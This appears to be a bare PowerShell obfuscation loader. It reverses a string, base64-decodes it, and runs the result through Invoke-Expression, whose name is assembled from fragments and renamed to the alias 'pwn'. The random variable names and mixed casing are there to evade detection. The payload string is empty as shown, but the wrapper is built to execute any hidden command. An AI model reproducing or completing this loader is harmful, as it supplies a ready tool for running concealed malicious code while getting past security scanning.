$45is7fqFQtXOuHwS = "" ;
$uT0 = $45is7fqFQtXOuHwS.ToCharArray() ; [array]::Reverse($uT0) ; -join $uT0 2>&1> $null ;
$GndO2OPsxPIOFzF3Yqo = [SySTeM.TeXt.eNCOdINg]::utf8.geTstRiNG([SySTEm.cONVErT]::frombASe64strING("$uT0")) ;
$SZCP4oH5k1qDXmJpxdK86nh7 = "inv"+"oKe"+"-EX"+"pre"+"Ssi"+"On" ; nEW-alias -NAMe pwn -VALUE $SZCP4oH5k1qDXmJpxdK86nh7 -forCE ; pWN $GndO2OPsxPIOFzF3Yqo ;

